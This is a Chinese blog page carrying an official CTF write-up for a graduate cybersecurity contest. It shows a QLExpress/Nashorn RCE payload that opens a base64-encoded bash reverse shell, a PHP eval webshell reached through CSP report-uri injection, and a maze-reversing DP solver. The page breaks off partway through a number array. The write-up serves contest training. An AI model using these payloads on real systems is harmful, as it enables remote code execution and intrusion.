@@ -1,0 +1,1143 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>华为杯第一届中国研究生网络安全创新大赛实网对抗赛初赛(一)官方WP | PUDONG LAB</title><meta name="author" content="朴冬,2559874620@qq.com/tyjiang@stu.xjtu.edu.cn"><meta name="copyright" content="朴冬"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="华为杯研网赛初赛官方WP(一):hashCode+QLExpress+CSP+50x50DP+迷宫花指令+LZSS六题综合。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="华为杯第一届中国研究生网络安全创新大赛实网对抗赛初赛(一)官方WP">
+<meta property="og:url" content="https://pudong617.github.io/2022/01/01/ctf-kb/wp/Misc/%E5%AE%98%E6%96%B9WP-%E4%B8%80-%E5%8D%8E%E4%B8%BA%E6%9D%AF-%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%A0%94%E7%A9%B6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E5%AE%9E%E7%BD%91%E5%AF%B9%E6%8A%97%E8%B5%9B%E5%88%9D%E8%B5%9B/">
+<meta property="og:site_name" content="PUDONG LAB">
+<meta property="og:description" content="华为杯研网赛初赛官方WP(一):hashCode+QLExpress+CSP+50x50DP+迷宫花指令+LZSS六题综合。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pudong617.github.io/img/youli.png">
+<meta property="article:published_time" content="2021-12-31T16:00:00.000Z">
+<meta property="article:modified_time" content="2021-12-31T16:00:00.000Z">
+<meta property="article:author" content="朴冬">
+<meta property="article:tag" content="hashCode绕过">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pudong617.github.io/img/youli.png"><link rel="shortcut icon" href="/img/PU-LOGO.png"><link rel="canonical" href="https://pudong617.github.io/2022/01/01/ctf-kb/wp/Misc/%E5%AE%98%E6%96%B9WP-%E4%B8%80-%E5%8D%8E%E4%B8%BA%E6%9D%AF-%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%B8%AD%E5%9B%BD%E7%A0%94%E7%A9%B6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B%E5%AE%9E%E7%BD%91%E5%AF%B9%E6%8A%97%E8%B5%9B%E5%88%9D%E8%B5%9B/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '华为杯第一届中国研究生网络安全创新大赛实网对抗赛初赛(一)官方WP',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2022-01-01 00:00:00'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><style>
+  /* 冷色极光渐变背景：与主题主色 #49B1F5 / #00C4B6 同色系 */
+  html #web_bg {
+    background-color: #F5FAFF;
+    background-image:
+      radial-gradient(1200px 700px at 12% -10%, rgba(73, 177, 245, .55), transparent 60%),
+      radial-gradient(1000px 650px at 92% 15%, rgba(0, 196, 182, .40), transparent 60%),
+      radial-gradient(900px 560px at 68% 108%, rgba(255, 114, 66, .16), transparent 62%),
+      linear-gradient(155deg, #E3F2FF 0%, #F6FBFF 45%, #E4F8F2 100%);
+  }
+  /* 暗色模式：同构图，降低光斑强度 */
+  html[data-theme='dark'] #web_bg {
+    background-color: #0B121A;
+    background-image:
+      radial-gradient(1100px 700px at 10% -8%, rgba(73, 177, 245, .45), transparent 62%),
+      radial-gradient(1000px 620px at 92% 12%, rgba(0, 196, 182, .32), transparent 62%),
+      radial-gradient(800px 520px at 72% 105%, rgba(255, 114, 66, .10), transparent 60%),
+      linear-gradient(160deg, #0B121A 0%, #0C1A24 50%, #0A1E20 100%);
+  }
+</style>
+<link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/youli.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">1050</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">879</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 分享</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> LINK</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background: radial-gradient(1100px 620px at 18% 8%, rgba(73, 177, 245, .55), transparent 60%), radial-gradient(900px 520px at 82% 22%, rgba(0, 196, 182, .45), transparent 62%), radial-gradient(700px 460px at 55% 108%, rgba(255, 114, 66, .18), transparent 60%), linear-gradient(155deg, #0A1A2B 0%, #0E3049 48%, #083F45 100%)"><nav id="nav"><span id="blog-info"><a href="/" title="PUDONG LAB"><img class="site-icon" src="/img/pudong.png"/></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 分享</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> LINK</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">华为杯第一届中国研究生网络安全创新大赛实网对抗赛初赛(一)官方WP</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-12-31T16:00:00.000Z" title="发表于 2022-01-01 00:00:00">2022-01-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-12-31T16:00:00.000Z" title="更新于 2022-01-01 00:00:00">2022-01-01</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/">CTF知识库</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/WP/">WP</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF%E7%9F%A5%E8%AF%86%E5%BA%93/Misc/">Misc</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="华为杯第一届中国研究生网络安全创新大赛实网对抗赛初赛(一)官方WP"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
+<p>原文: <a target="_blank" rel="noopener" href="https://www.ctfiot.com/76054.html">https://www.ctfiot.com/76054.html</a><br>ID: 76054</p>
+</blockquote>
+<p>babyql</p>
+<p>首先需要绕过hashCode,利用hashCode &#x3D; s[0] * 31 + s[1]</p>
+<p>传入”x”:”guanzhujiarandundunjiechbO”,即可绕过</p>
+<p>观察到runner.execute(cmd, context, null, true, false);的第一个参数可控</p>
+<p>网上并不能搜到利用QLExpressRCE的相关信息</p>
+<p>查阅QLExpress官方文档</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/alibaba/QLExpress">https://github.com/alibaba/QLExpress</a></p>
+<p>可以看到可以通过第一个参数来执行表达式</p>
+<p>但是其有默认的黑名单</p>
+<p>又注意到题目中的黑名单</p>
+<p>“process|runtime|javascript|+|char|\|from|[|]|load”</p>
+<p>java.lang.Runtime.getRuntime().exec(“bash -c {echo,ZWNobyxiYXNoIC1pID4mIC9kZXYvdGNwL2lwL3BvcnQgMD4mMQ&#x3D;&#x3D;}|{base64,-d}|{bash,-i}”).getInputStream()</p>
+<p>%6A%61%76%61%2E%6C%61%6E%67%2E%52%75%6E%74%69%6D%65%2E%67%65%74%52%75%6E%74%69%6D%65%28%29%2E%65%78%65%63%28%22%62%61%73%68%20%2D%63%20%7B%65%63%68%6F%2C%5A%57%4E%6F%62%79%78%69%59%58%4E%6F%49%43%31%70%49%44%34%6D%49%43%39%6B%5A%58%59%76%64%47%4E%77%4C%32%6C%77%4C%33%42%76%63%6E%51%67%4D%44%34%6D%4D%51%3D%3D%7D%7C%7B%62%61%73%65%36%34%2C%2D%64%7D%7C%7B%62%61%73%68%2C%2D%69%7D%22%29%2E%67%65%74%49%6E%70%75%74%53%74%72%65%61%6D%28%29</p>
+<p>{<br>“cmd”:”import javax.script.ScriptEngineManager;new ScriptEngineManager().getEngineByName(“nashorn”).eval(java.net.URLDecoder.decode(“%6A%61%76%61%2E%6C%61%6E%67%2E%52%75%6E%74%69%6D%65%2E%67%65%74%52%75%6E%74%69%6D%65%28%29%2E%65%78%65%63%28%22%62%61%73%68%20%2D%63%20%7B%65%63%68%6F%2C%5A%57%4E%6F%62%79%78%69%59%58%4E%6F%49%43%31%70%49%44%34%6D%49%43%39%6B%5A%58%59%76%64%47%4E%77%4C%32%6C%77%4C%33%42%76%63%6E%51%67%4D%44%34%6D%4D%51%3D%3D%7D%7C%7B%62%61%73%65%36%34%2C%2D%64%7D%7C%7B%62%61%73%68%2C%2D%69%7D%22%29%2E%67%65%74%49%6E%70%75%74%53%74%72%65%61%6D%28%29”));”,<br>“x”:”guanzhujiarandundunjiechbO”<br>}</p>
+<?php
+if($_SERVER['REMOTE_ADDR']!=='127.0.0.1'){
+    die('only from local!');
+}
+else{
+    $postdata = file_get_contents('php://input');
+    $kv_list = explode('&',$postdata);
+    if(count($kv_list)>0){
+        foreach ($kv_list as $value){
+            $kv = explode('=',$value);
+            if(count($kv)==2){
+                if($kv[0]==="bbzl's shell"){
+                    eval($kv[1]);
+                }
+            }
+        }
+    }
+}
+
+Content-Security-Policy-Report-Only=img-src%20none;%20report-uri%20/shell.php;%26bbzl%27s%20shell=system(%27touch%20/tmp/1%27);%26
+
+{"csp-report":{"document-uri":"http://124.221.138.51/template/img.php?Content-Security-Policy-Report-Only=img-src%20none;%20report-uri%20/shell.php;%26bbzl%27s%20shell=system(%27touch%20/tmp/1%27);%26","referrer":"","violated-directive":"img-src","effective-directive":"img-src","original-policy":"img-src none; report-uri /shell.php;&bbzl's shell=system('touch /tmp/1');&","disposition":"report","blocked-uri":"[图片已移除]","line-number":2,"source-file":"http://124.221.138.51/template/img.php?Content-Security-Policy-Report-Only=img-src%20none;%20report-uri%20/shell.php;%26bbzl%27s%20shell=system(%27touch%20/tmp/1%27);%26","status-code":
+200,"script-sample":""}}
+
+0x00001251 <+4>:    push   ebp
+0x00001252 <+5>:    mov    ebp,esp
+0x00001254 <+7>:    sub    esp,0x10
+0x00001257 <+10>:    mov    DWORD PTR [ebp-0x10],0x0
+0x0000125e <+17>:    mov    DWORD PTR [ebp-0xc],0x0
+0x00001265 <+24>:    mov    eax,DWORD PTR [ebp-0x10]
+0x00001268 <+27>:    imul   edx,eax,0xc8
+0x0000126e <+33>:    mov    eax,DWORD PTR [ebp+0x10]
+0x00001271 <+36>:    add    edx,eax
+0x00001273 <+38>:    mov    eax,DWORD PTR [ebp-0xc]
+0x00001276 <+41>:    mov    eax,DWORD PTR [edx+eax*4]
+0x00001279 <+44>:    mov    DWORD PTR [ebp-0x8],eax
+0x0000127c <+47>:    mov    DWORD PTR [ebp-0x4],0x0
+0x00001283 <+54>:    jmp    0x12dd <verify+144>
+0x00001285 <+56>:    mov    edx,DWORD PTR [ebp-0x4]
+0x00001288 <+59>:    mov    eax,DWORD PTR [ebp+0x8]
+0x0000128b <+62>:    add    eax,edx
+0x0000128d <+64>:    movzx  eax,BYTE PTR [eax]
+0x00001290 <+67>:    cmp    al,0x52
+0x00001292 <+69>:    jne    0x12a0 <verify+83>
+0x00001294 <+71>:    cmp    DWORD PTR [ebp-0xc],0x30
+0x00001298 <+75>:    jg     0x12a0 <verify+83>
+0x0000129a <+77>:    add    DWORD PTR [ebp-0xc],0x1
+0x0000129e <+81>:    jmp    0x12c2 <verify+117>
+0x000012a0 <+83>:    mov    edx,DWORD PTR [ebp-0x4]
+0x000012a3 <+86>:    mov    eax,DWORD PTR [ebp+0x8]
+0x000012a6 <+89>:    add    eax,edx
+0x000012a8 <+91>:    movzx  eax,BYTE PTR [eax]
+0x000012ab <+94>:    cmp    al,0x44
+0x000012ad <+96>:    jne    0x12bb <verify+110>
+0x000012af <+98>:    cmp    DWORD PTR [ebp-0x10],0x30
+0x000012b3 <+102>:    jg     0x12bb <verify+110>
+0x000012b5 <+104>:    add    DWORD PTR [ebp-0x10],0x1
+0x000012b9 <+108>:    jmp    0x12c2 <verify+117>
+0x000012bb <+110>:    mov    eax,0x0
+0x000012c0 <+115>:    jmp    0x12f1 <verify+164>
+0x000012c2 <+117>:    mov    eax,DWORD PTR [ebp-0x10]
+0x000012c5 <+120>:    imul   edx,eax,0xc8
+0x000012cb <+126>:    mov    eax,DWORD PTR [ebp+0x10]
+0x000012ce <+129>:    add    edx,eax
+0x000012d0 <+131>:    mov    eax,DWORD PTR [ebp-0xc]
+0x000012d3 <+134>:    mov    eax,DWORD PTR [edx+eax*4]
+0x000012d6 <+137>:    add    DWORD PTR [ebp-0x8],eax
+0x000012d9 <+140>:    add    DWORD PTR [ebp-0x4],0x1
+0x000012dd <+144>:    mov    eax,DWORD PTR [ebp-0x4]
+0x000012e0 <+147>:    cmp    eax,DWORD PTR [ebp+0xc]
+0x000012e3 <+150>:    jl     0x1285 <verify+56>
+0x000012e5 <+152>:    mov    eax,DWORD PTR [ebp-0x8]
+0x000012e8 <+155>:    cmp    eax,DWORD PTR [ebp+0x14]
+0x000012eb <+158>:    sete   al
+0x000012ee <+161>:    movzx  eax,al
+0x000012f1 <+164>:    leave  
+0x000012f2 <+165>:    ret
+
+int verify(const char* input, int size, int map[50][50], int max_val) {
+    int x=0, y=0;
+    int sum = map[x][y];
+    for(int i = 0;i<size;++i) {
+        if(input[i] == 'R' && y<49) {
+            ++y;
+        } else if (input[i]=='D' && x<49) {
+            ++x;
+        } else {
+            return 0;
+        }
+        sum += map[x][y];
+    }
+    return sum == max_val;
+}
+
+def get_solution(arr):
+    dp = [[0 for j in range(50)] for i in range(50)]
+    dp[0][0] = arr[0][0]
+    for i in range(1, 50):
+        dp[0][i] = dp[0][i-1] + arr[0][i]
+    for i in range(1, 50):
+        dp[i][0] = dp[i-1][0] + arr[i][0]
+    for i in range(1, 50):
+        for j in range(1, 50):
+            dp[i][j] = max(dp[i][j-1], dp[i-1][j]) + arr[i][j]
+
+    max_val = 0
+    max_idx = 0
+    for i in range(50):
+        if dp[49][i] > max_val:
+            max_val = dp[49][i]
+            max_idx = i
+
+    if dp[49].count(max_val) > 1:
+        #print("Multi solution!")
+        return None
+
+    sol = ""
+    level = 49
+    while level > 0:
+        if max_idx > 0:
+            if dp[level][max_idx-1] > dp[level-1][max_idx]:
+                sol = "R" + sol
+                max_idx = max_idx - 1
+            elif dp[level][max_idx-1] < dp[level-1][max_idx]:
+                sol = "D" + sol
+                level = level - 1
+            else:
+                #print("Multi solution!")
+                return None
+        else:
+            sol = "D" + sol
+            level = level - 1
+
+    for i in range(max_idx):
+        sol = "R" + sol
+
+    return sol, max_val, dp
+
+arr = [
+  [31,59,162,34,11,176,34,153,214,239,218,184,200,169,189,168,168,75,172,184,132,174,33,214,238,31,71,144,229,209,235,214,39,53,19,190,222,192,31,92,55,29,6,239,233,157,64,88,94,239],
+  [11,117,166,47,72,16,6,70,190,177,110,123,56,36,209,44,152,130,13,162,35,11,112,187,92,226,123,192,209,201,132,150,100,188,253,120,210,247,172,25,63,74,86,208,60,38,9,151,108,99],
+  [45,117,151,132,252,117,105,170,183,87,123,43,45,207,162,13,146,114,76,220,209,31,178,84,210,196,221,62,36,12,1,155,86,150,220,204,145,228,119,38,240,107,137,105,227,18,185,78,36,24],
+  [240,122,104,46,183,177,96,65,65,222,69,211,192,222,233,7,36,34,55,139,154,135,95,36,124,94,133,61,208,140,223,194,176,156,243,68,51,83,138,235,30,249,172,151,121,171,172,205,147,53],
+  [90,14,62,152,181,58,208,251,210,178,70,37,235,45,88,78,219,183,103,35,19,173,232,160,13,36,250,252,214,33,176,190,115,113,216,210,160,150,100,237,4,37,10,110,139,6,68,252,53,22],
+  [154,7,3,33,93,55,42,111,112,137,228,172,208,111,68,110,48,20,238,226,110,54,42,164,64,211,226,228,29,3,50,206,141,220,244,59,155,19,195,129,105,188,181,151,232,204,209,149,211,22],
+  [155,113,94,226,183,51,57,202,68,84,222,44,32,71,172,100,22,15,153,91,97,183,62,48,149,51,235,122,208,161,24,142,1,215,223,234,162,158,228,193,146,182,85,175,133,138,15,225,24,182],
+  [182,177,51,87,231,126,112,84,173,206,223,2,137,76,216,125,132,229,59,52,134,65,195,112,122,190,250,23,240,70,182,39,171,255,67,143,84,53,254,238,238,25,143,17,249,211,72,121,109,57],
+  [245,140,112,220,67,65,112,52,46,186,252,130,249,236,194,92,196,53,211,179,91,119,83,6,184,205,248,233,159,130,204,130,143,171,227,30,167,23,146,134,166,11,128,64,251,119,160,23,59,24],
+  [162,54,17,217,11,127,203,183,251,171,237,202,188,202,52,39,109,175,127,193,11,248,10,99,212,8,183,147,134,228,111,148,13,50,186,67,85,16,242,216,192,128,129,28,82,15,173,129,92,224],
+  [119,69,43,81,75,180,69,109,11,250,14,241,124,193,137,144,53,175,165,39,211,135,247,173,243,253,44,213,92,192,145,138,217,104,18,82,252,101,135,90,55,115,248,235,256,139,78,42,239,17],
+  [132,221,29,180,170,62,26,140,34,199,161,66,66,28,250,53,237,42,223,5,42,15,31,109,68,141,35,239,142,5,80,12,75,123,12,181,139,131,167,173,72,107,150,252,242,106,240,12,79,147],
+  [194,65,155,224,195,186,208,73,221,132,120,73,110,28,91,204,111,199,127,164,166,204,250,11,209,209,81,237,146,125,233,177,79,140,175,44,13,56,179,82,80,227,167,105,170,13,248,251,72,152],
+  [222,223,7,195,246,248,255,115,188,106,85,117,244,35,191,43,135,254,172,234,101,70,105,96,30,248,37,39,168,256,156,24,130,96,169,99,93,136,223,151,76,71,101,239,178,188,11,191,82,2],
+  [41,15,2,40,221,165,207,22,81,239,150,139,161,78,246,87,120,70,121,125,244,238,176,56,35,173,24,196,47,66,197,228,153,55,204,151,251,81,87,184,43,247,226,155,62,219,65,38,48,241],
+  [226,163,167,252,187,253,65,138,251,229,236,203,79,71,213,55,36,232,29,173,156,41,174,131,90,31,129,14,66,247,153,122,228,192,14,180,118,223,213,255,53,143,205,1,166,189,155,19,13,116],
+  [111,115,183,159,38,251,99,65,84,84,97,247,217,188,2,80,141,149,173,115,131,141,72,107,106,203,162,90,20,47,156,99,99,56,121,190,240,201,87,156,0,96,196,12,122,175,24,195,73,184],
+  [116,17,63,197,252,226,159,220,105,247,138,234,171,86,187,108,11,104,123,207,255,122,24,62,249,217,50,231,54,64,134,5,140,239,171,125,128,115,178,120,107,46,64,125,78,112,128,241,24,27],
+  [74,163,34,13,2,168,126,60,219,19,31,82,44,175,124,8,223,32,12,208,119,36,206,110,61,210,157,202,228,96,199,115,77,109,160,78,194,124,73,254,141,1,97,249,12,27,153,193,51,207],
+  [78,182,92,255,94,256,244,173,51,197,28,34,178,143,173,197,94,132,194,244,24,240,3,162,66,68,182,102,20,71,131,142,105,122,121,157,61,185,203,227,110,110,117,5,225,73,57,129,132,25],
+  [100,113,138,85,153,115,154,167,132,80,36,23,111,86,221,42,196,98,113,89,175,19,145,140,150,51,6,21,184,213,162,101,252,115,36,165,186,145,176,8,102,1,206,30,119,56,130,185,61,226],
+  [109,237,182,134,35,117,127,49,111,90,141,83,239,141,60,105,214,107,62,25,250,133,254,105,97,141,187,230,110,180,178,192,206,49,242,71,138,168,105,57,63,247,47,148,80,5,117,123,147,188],
+  [136,10,134,193,227,229,232,185,119,238,123,0,172,27,17,73,1,86,43,41,188,16,90,146,229,230,3,215,25,193,143,232,17,193,195,256,242,38,182,73,25,140,17,178,89,78,247,1,133,22],
+  [65,220,147,60,28,101,152,106,218,245,127,254,37,118,224,192,46,123,16,203,23,138,57,50,256,227,198,180,177,25,141,87,111,234,103,10,148,73,91,15,36,105,79,129,90,79,170,217,87,181],
+  [12,76,85,27,62,115,116,221,166,243,97,135,142,223,192,220,33,86,30,135,142,143,78,249,137,56,218,34,186,111,121,31,184,230,12,195,189,31,20,148,59,233,179,20,141,179,147,60,194,175],
+  [247,108,209,92,201,117,164,253,211,194,114,62,59,103,123,228,39,100,62,243,164,169,224,35,59,94,6,10,187,116,44,152,55,117,37,227,49,145,133,235,31,18,215,2,168,42,154,68,184,10],
+  [93,0,200,198,247,163,123,117,98,44,158,61,114,11,56,3,128,39,105,0,176,29,100,2,119,115,145,135,138,28,4,119,166,183,45,249,196,192,90,161,126,214,161,42,202,150,70,245,62,123],
+  [12,59,139,135,117,158,90,0,121,255,105,58,26,247,213,105,205,125,232,54,238,210,9,101,85,96,94,151,118,48,125,119,77,236,66,75,241,108,90,85,137,88,19,166,245,108,33,208,154,88],
+  [230,149,85,121,249,128,165,106,85,137,161,25,247,253,95,254,132,123,17,10,230,72,206,174,168,228,250,164,79,12,77,195,219,209,211,208,57,247,165,254,250,203,48,199,6,49,112,31,172,78],
+  [21,97,244,163,61,138,24,93,235,187,107,49,231,129,166,168,105,213,188,120,81,136,70,129,78,246,118,160,230,66,83,99,250,176,99,21,109,172,99,235,86,180,145,99,49,31,99,126,198,47],
+  [72,75,7,120,42,113,216,241,46,207,34,176,37,117,84,20,86,214,136,125,61,44,216,61,177,66,182,134,108,64,94,91,4,12,244,131,20,254,121,237,26,199,57,217,43,40,57,1,124,234],
+  [125,96,128,252,63,0,161,130,104,115,21,70,223,4,212,68,45,233,143,124,40,238,249,3,206,176,102,188,208,120,186,252,16,155,94,235,67,25,226,119,136,244,25,156,240,244,193,17,218,169],
+  [148,20,159,113,52,168,229,213,172,200,70,244,69,168,195,96,168,152,200,47,123,139,120,116,192,14,134,145,163,199,196,120,174,70,21,234,22,88,102,127,55,22,245,19,16,187,114,119,252,112],
+  [54,237,256,58,55,182,70,66,214,177,126,106,80,65,218,235,191,94,213,252,57,165,13,190,224,52,11,36,208,141,119,194,231,253,16,169,239,37,25,251,1,241,247,133,12,34,244,86,67,43],
+  [29,40,108,109,205,7,88,206,29,221,123,141,251,76,64,68,204,228,57,195,15,188,6,113,46,174,116,40,71,125,180,240,10,23,18,226,240,208,180,57,53,205,205,101,64,97,63,251,77,106],
+  [176,146,160,144,239,64,63,255,105,121,75,204,194,66,168,166,253,54,84,33,185,175,146,86,54,87,127,141,14,170,248,81,26,21,25,194,9,24,241,213,185,43,144,133,112,142,7,55,17,49],
+  [156,27,118,8,111,22,164,28,80,16,69,23,14,14,181,141,48,15,161,46,92,79,198,212,121,42,41,0,206,186,81,42,166,158,33,104,153,7,181,88,164,105,29,247,10,211,98,103,224,186],
+  [38,122,27,198,206,166,139,212,204,199,125,209,190,166,162,1,109,126,251,106,181,176,31,93,89,70,103,193,153,102,154,253,116,72,61,214,46,63,154,142,127,34,80,166,230,12,75,139,204,25],
+  [79,27,105,30,175,107,158,21,179,84,48,202,38,87,148,250,145,49,147,112,82,93,234,8,144,161,201,55,9,250,249,19,245,51,211,143,226,214,30,66,199,18,98,243,142,96,119,254,13,145],
